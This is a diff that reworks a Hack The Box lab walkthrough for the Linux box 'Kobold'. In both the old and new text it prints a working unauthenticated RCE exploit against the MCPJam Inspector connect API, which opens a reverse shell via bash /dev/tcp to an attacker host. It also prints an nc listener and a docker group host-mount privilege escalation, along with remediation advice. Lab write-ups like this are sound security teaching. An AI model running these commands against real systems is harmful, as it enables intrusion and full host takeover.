@@ -1,49 +1,25 @@
-<div align="center">
+# HTB: Kobold
 
-# HTB // KOBOLD
-### Linux · Unauthenticated RCE → Docker Group Privilege Escalation
+`hackthebox` `linux` `mcp` `unauthenticated-rce` `docker-privesc`
 
-`HACK THE BOX` · `LINUX` · `WEB EXPLOITATION` · `PRIVILEGE ESCALATION`
+Kobold is a Linux box built around a self-hosted MCP (Model Context Protocol) tooling API. The MCPJam Inspector's "connect" endpoint accepts attacker-controlled data describing how to launch a subprocess — which is a command-execution primitive with extra steps. That gets an unauthenticated shell as `ben`. From there, `ben`'s membership in the `docker` group turns into root in one command, by mounting the host filesystem into a container.
 
-</div>
-
----
-
-## 1) Executive Summary
+## Box Info
 
 | | |
 |---|---|
-| **Objective** | Assess the attack surface of HTB machine **Kobold** and identify exploitable weaknesses leading to full compromise. |
-| **Difficulty** | Linux |
-| **Root Cause** | Unauthenticated RCE in a third-party MCP tooling API, followed by trivial privilege escalation via Docker group membership. |
-| **Outcome** | Full compromise — user and root flags captured. |
-| **Business Impact** | An unauthenticated attacker with network access to the host could obtain a shell, pivot to any user in the `docker` group, and escalate to root by mounting the host filesystem inside a container. This represents a complete loss of confidentiality, integrity, and availability for the host. |
+| **OS** | Linux |
+| **Target** | `<TARGET_IP>` |
+| **Date** | March 21, 2026 |
+| **Outcome** | Full compromise — user and root flags captured |
 
----
-
-## 2) Scope
-
-- **In-scope target:** HTB machine **Kobold** (Linux)
-- **Time window:** March 21, 2026
-- **Constraints:** Black-box, unauthenticated initial access. Respect HTB rules. No destructive testing.
-- **Out-of-scope:** Anything not hosted on the target, and any accounts/data outside the lab.
-
-## 3) Rules of Engagement
-
-- **Safety:** Avoid DoS. Brute-force only where intended and rate-limited.
-- **Evidence handling:** Raw outputs stored under `./evidence/`, SHA256 computed per artifact.
-- **Reproducibility:** Exact commands, tool versions, and timestamps (local timezone) recorded throughout.
-
-## 4) Methodology
-
-**Recon** — full TCP sweep, then targeted service enumeration:
+## Recon
 
 ```bash
 nmap -p- -sV -sC -T4 --min-rate 5000 <TARGET_IP> -oA evidence/EV-001-nmap-full
-nmap -p <OPEN_PORTS> -sV -sC <TARGET_IP> -oA evidence/EV-002-nmap-targeted
 ```
 
-**Initial recon results:**
+Open ports:
 
 | Port | Service |
 |---|---|
@@ -52,59 +28,34 @@ nmap -p <OPEN_PORTS> -sV -sC <TARGET_IP> -oA evidence/EV-002-nmap-targeted
 | 443 | https |
 | 3552 | taserver |
 
-**Web enumeration** — vhost discovery, directory brute force, tech fingerprinting:
+The HTTPS service on 443 fronts `mcp.kobold.htb`, running **MCPJam Inspector** — a debugging/testing UI for MCP servers. MCP servers are normally launched as local subprocesses (spawn a binary, talk to it over stdio), so an API that lets a *remote, unauthenticated* caller choose what gets spawned is worth a closer look.
 
-```bash
-whatweb http://<TARGET>/
-ffuf -u http://<TARGET>/FUZZ -w /path/wordlist.txt -fc 404
-ffuf -u http://<TARGET>/ -H 'Host: FUZZ.<DOMAIN>' -w /path/subdomains.txt
-```
-
-**Auth testing** — default creds, weak auth flows, password policy observations.
-
-**Exploit validation** — minimal PoC to confirm impact, then controlled escalation.
-
-**Privilege escalation** — enumeration of local misconfigurations, SUID/SGID binaries, cron jobs, capabilities, kernel version, stored credentials, and service configs.
-
-## 5) Findings Overview
-
-| Severity | ID | Title | Affected Asset | Category (CWE) | Status |
-|---|---|---|---|---|---|
-| High | F-001 | Unauthenticated RCE via MCPJam Inspector Connect API (CVE-2026-23744) | `mcp.kobold.htb/api/mcp/connect` (TCP/443) | Code Injection / RCE | Confirmed |
-| High | F-002 | Privilege escalation via Docker group membership (host filesystem mount) | Local user `ben` | Privilege Misconfiguration | Confirmed |
-
-## 6) Detailed Findings
-
-### [F-001] Unauthenticated RCE via MCPJam Inspector Connect API (CVE-2026-23744)
+## Shell as ben — [F-001] Unauthenticated RCE via MCPJam Inspector Connect API
 
 | | |
 |---|---|
 | **Severity** | High |
 | **CVE** | CVE-2026-23744 |
-| **Affected** | `https://mcp.kobold.htb/api/mcp/connect` (HTTPS, TCP/443) |
+| **Affected** | `https://mcp.kobold.htb/api/mcp/connect` (TCP/443) |
 
-**Description**
-The MCPJam Inspector "connect" API accepted attacker-supplied `serverConfig` data. By supplying a malicious `command` and `args`, it was possible to make the service execute arbitrary OS commands.
+The Inspector's `/api/mcp/connect` endpoint takes a `serverConfig` object with `command` and `args` — the values it uses to spawn an MCP server subprocess. There's no validation stopping those values from being `bash -c <anything>`.
 
-**Impact**
-Unauthenticated remote attackers can obtain code execution on the target host, leading to full compromise — initial access, credential theft, lateral movement, and privilege escalation.
-
-**Exploit command (attacker):**
-
-```bash
-python3 -c "import requests; requests.post('https://mcp.kobold.htb/api/mcp/connect', headers={'Content-Type': 'application/json'}, json={'serverConfig': {'command': 'bash', 'args': ['-c', 'bash -i >& /dev/tcp/10.10.14.252/4444 0>&1'], 'env': {}}, 'serverId': 'exploit'}, verify=False)"
-```
-
-**Listener (attacker):**
+Listener first:
 
 ```bash
 nc -lvnp 4444
 ```
 
-**Result — reverse shell:**
+Then the exploit request, redirecting the "launch an MCP server" flow into a reverse shell:
+
+```bash
+python3 -c "import requests; requests.post('https://mcp.kobold.htb/api/mcp/connect', headers={'Content-Type': 'application/json'}, json={'serverConfig': {'command': 'bash', 'args': ['-c', 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'], 'env': {}}, 'serverId': 'exploit'}, verify=False)"
+```
+
+Back at the listener:
 
 ```
-connect to [10.10.14.252] from (UNKNOWN) [10.129.9.189] 56156
+connect to [<ATTACKER_IP>] from (UNKNOWN) [<TARGET_IP>] 56156
 ben@kobold:/usr/local/lib/node_modules/@mcpjam/inspector$ ls
 LICENSE
 README.md
@@ -115,112 +66,68 @@ node_modules
 package.json
 ```
 
-**Proof — user flag:**
+Landing inside the Inspector's own install directory confirms this is exactly the service it looks like, running as `ben`.
 
 ```
 ben@kobold:~$ cat user.txt
-f21a134ada656546e56a9d44e1af97fc
+<USER_FLAG_REDACTED>
 ```
 
-**Artifacts**
-- `EV-010` — exploit request payload + terminal output (SHA256: TBD)
-- `EV-011` — reverse shell session transcript (SHA256: TBD)
+**Artifacts:** `EV-010` (exploit payload + terminal output), `EV-011` (reverse shell transcript)
 
-**Steps to Reproduce**
-1. Start a listener on the attacking host: `nc -lvnp 4444`.
-2. Send a crafted `POST` request to `/api/mcp/connect` that sets `serverConfig.command` and `serverConfig.args` to execute a reverse shell.
-3. Observe the inbound connection and validate command execution (`id`, `hostname`, `pwd`).
-
-**Remediation**
-- **Immediate:** Upgrade MCPJam Inspector to a patched version (>= 1.4.3) or remove the service from exposure.
-- **Containment:** Bind the service to `127.0.0.1` or restrict access via firewall / reverse proxy allowlist.
-- **Hardening:** Add authentication/authorization to the connect API, validate/deny dangerous commands, run the service under a locked-down account with least privilege.
-
-**References**
-- NVD: https://nvd.nist.gov/vuln/detail/CVE-2026-23744
-
----
-
-### [F-002] Privilege Escalation via Docker Group Membership (Host Filesystem Mount)
+## Shell as root — [F-002] Privilege Escalation via Docker Group Membership
 
 | | |
 |---|---|
 | **Severity** | High |
-| **Category** | Privilege Misconfiguration / Excessive Privileges |
-| **Affected** | Local user `ben` (member of `docker` group), Docker daemon socket access |
+| **Category** | Privilege Misconfiguration (Excessive Privileges) |
+| **Affected** | Local user `ben` (member of `docker` group) |
 
-**Description**
-User `ben` was able to switch into the `docker` group (`newgrp docker`) and interact with the local Docker daemon. Because containers can mount the host filesystem, this effectively granted root-equivalent access.
-
-**Impact**
-A local attacker with `docker` group access can read arbitrary root-owned files and achieve full system compromise (root).
-
-**Group membership evidence:**
+Group check is always step one on Linux privesc:
 
 ```
 uid=1001(ben) gid=111(docker) groups=111(docker),37(operator),1001(ben)
 ```
 
-**Root flag read via container + host mount:**
+`ben` is in `docker`. That's root, full stop — the daemon runs as root, so anyone who can talk to it can ask for a container with the host's `/` bind-mounted in, then read (or write) anything on the host from inside that container.
+
+Any locally-available image works here — it's just being used as a `cat` wrapper:
 
 ```bash
 docker run -v /:/hostfs --rm --user root --entrypoint cat privatebin/nginx-fpm-alpine:2.0.2 /hostfs/root/root.txt
 ```
 
 ```
-548860780f0c38aa3c4b6d6b9efee973
+<ROOT_FLAG_REDACTED>
 ```
 
-**Artifacts**
-- `EV-020` — docker group proof + root flag read transcript (SHA256: TBD)
+No root shell on the host ever needed — the container did the reading, and the container ran as root by definition.
 
-**Steps to Reproduce**
-1. Confirm membership in `docker` (or switch groups with `newgrp docker`).
-2. Run a container image available locally.
-3. Mount the host root filesystem (e.g., `-v /:/hostfs`) and access `/hostfs/root/root.txt`.
+**Artifacts:** `EV-020` (docker group proof + root flag read transcript)
 
-**Remediation**
-- Remove untrusted users from the `docker` group.
-- Restrict access to `/run/docker.sock`.
-- Use rootless Docker where feasible.
-- Apply least privilege and monitoring around container runtime operations.
-
-## 7) Attack Narrative and Timeline
+## Attack Timeline
 
 | Time (local) | Action | Result | Evidence |
 |---|---|---|---|
-| 2026-03-21 15:06 | TCP service discovery | Open: `22/ssh`, `80/http`, `443/https`, `3552/taserver` | EV-001 |
-| 2026-03-21 15:06 | UDP top-ports check | No open UDP ports observed in sample (all closed) | EV-0XX |
+| 2026-03-21 15:06 | TCP service discovery | Open: 22/ssh, 80/http, 443/https, 3552/taserver | EV-001 |
+| 2026-03-21 15:06 | UDP top-ports check | No open UDP ports observed | EV-0XX |
 | 2026-03-21 ~16:0X | Unauthenticated RCE via MCPJam Inspector connect API | Reverse shell as `ben`, user flag captured | EV-010, EV-011 |
-| 2026-03-21 ~16:0X | Privilege escalation | Switched into `docker` group and read root flag via host mount | EV-020 |
+| 2026-03-21 ~16:0X | Docker group → host mount | Root flag read via container escape | EV-020 |
 
-## 8) Recommendations and Roadmap
+## Remediation
 
-- **Immediate:** Patch/disable exposed services, restrict access, rotate any exposed credentials.
-- **Short-term:** Harden auth, remove secrets from repos/configs, add WAF rules where applicable.
-- **Long-term:** Defense-in-depth — least privilege, segmentation, monitoring, secure SDLC.
-- **Verification:** Re-test each fix against the original reproduction steps and confirm evidence.
+- **F-001:** Upgrade MCPJam Inspector to ≥1.4.3, or take it off the public internet — bind to `127.0.0.1` behind an authenticated reverse proxy. The connect API should never accept an arbitrary `command`/`args` pair from an untrusted caller.
+- **F-002:** Don't put unprivileged users in `docker` — it's root-equivalent by design. Use rootless Docker, or gate container operations behind tightly-scoped `sudo` rules if shell access is genuinely required.
 
-## 9) Evidence Index
+## Evidence Index
 
-| Evidence ID | Description | Source / Command | Hash (SHA256) | Location |
-|---|---|---|---|---|
-| EV-001 | Nmap full TCP scan | `nmap -p- -sV -sC ...` | TBD | `./evidence/EV-001-nmap-full.*` |
-| EV-002 | Nmap targeted scan | `nmap -p ...` | TBD | `./evidence/EV-002-nmap-targeted.*` |
-| EV-010 | Exploit payload + terminal output | Python RCE PoC | TBD | `./evidence/EV-010-*` |
-| EV-011 | Reverse shell session transcript | `nc -lvnp 4444` | TBD | `./evidence/EV-011-*` |
-| EV-020 | Docker group proof + root flag read | `docker run -v /:/hostfs ...` | TBD | `./evidence/EV-020-*` |
-
-## 10) Appendix
-
-**Tooling & versions:** nmap, ffuf, gobuster, curl, nikto, feroxbuster, linpeas, pspy
-
-**Notes:** N/A
+| ID | Description | Location |
+|---|---|---|
+| EV-001 | Nmap full TCP scan | `./evidence/EV-001-nmap-full.*` |
+| EV-002 | Nmap targeted scan | `./evidence/EV-002-nmap-targeted.*` |
+| EV-010 | RCE exploit payload + output | `./evidence/EV-010-*` |
+| EV-011 | Reverse shell transcript | `./evidence/EV-011-*` |
+| EV-020 | Docker privesc transcript | `./evidence/EV-020-*` |
 
 ---
 
-<div align="center">
-
-*Part of the [D4RKGUNN3R Hack The Box Walkthroughs](../) series — documenting methodology, evidence, and remediation for every box.*
-
-</div>
